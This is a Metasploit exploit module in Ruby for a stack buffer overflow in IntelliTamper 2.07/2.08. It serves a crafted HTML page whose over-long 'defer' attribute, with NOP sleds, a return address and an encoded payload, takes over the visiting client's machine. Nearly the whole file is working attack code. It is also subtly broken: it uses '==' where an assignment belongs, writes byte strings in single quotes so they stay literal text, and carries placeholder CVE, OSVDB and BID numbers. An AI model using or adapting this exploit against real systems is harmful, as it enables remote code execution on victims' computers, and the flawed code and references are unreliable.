##
# $Id: IntelliTamper.rb
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::Remote::Seh

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'IntelliTamper 2.07/2.08 (defer) Remote Buffer Overflow ',
            'Description'    => %q{
                    This module exploits a stack overflow in the IntelliTamper.
                    By sending an overly long string to the "defer"
                    script, an attacker may be able to execute arbitrary code.
            },
            'License'        => MSF_LICENSE,
            'Author'         => [ 'Stack, Mountassif Moad' ],
            'Version'        =>  '$Revision$',
            'References'     =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/11220'],
                    [ 'CVE', '2009-0' ],
                    [ 'OSVDB', '0' ],
                    [ 'BID', '00, 01' ],
                    [ 'EDB', '11220' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload'        =>
                {
                    'Space'         => 950,
                    'BadChars'      => "\x00\x3C\x01",
                    'StackAdjustment' => -3500,
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'IntelliTamper 2.07/2.08',     { 'Offset' => 6236, 'Ret' => 0x0040103b } ], #  intellitamper.exe
                ],
            'DisclosureDate' => 'Jan 22 2009',
            'DefaultTarget'  => 0))
    end


    def on_request_uri(cli, request)
        # Re-generate the payload
        return if ((p = regenerate_payload(cli)) == nil)

        # Set the exploit buffer

        sploit == '<html><head><title>loneferret test</title></head><body>'
        sploit += '<script defer="'
        sploit += "\x41" * 6236
        sploit += make_nops(180)
        sploit += '\xE9\x55\xFE\xFF\xFF'
        sploit += '\xeb\xd0\x90\x90'
        sploit += [target.ret].pack('V')
        sploit += make_nops(50)
        sploit += payload.encoded
        sploit += '">'
        sploit +=  '</body></html>'
        print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

        # Transmit the response to the client
        send_response_html(cli, sploit)

        # Handle the payload
        handler(cli)
    end

end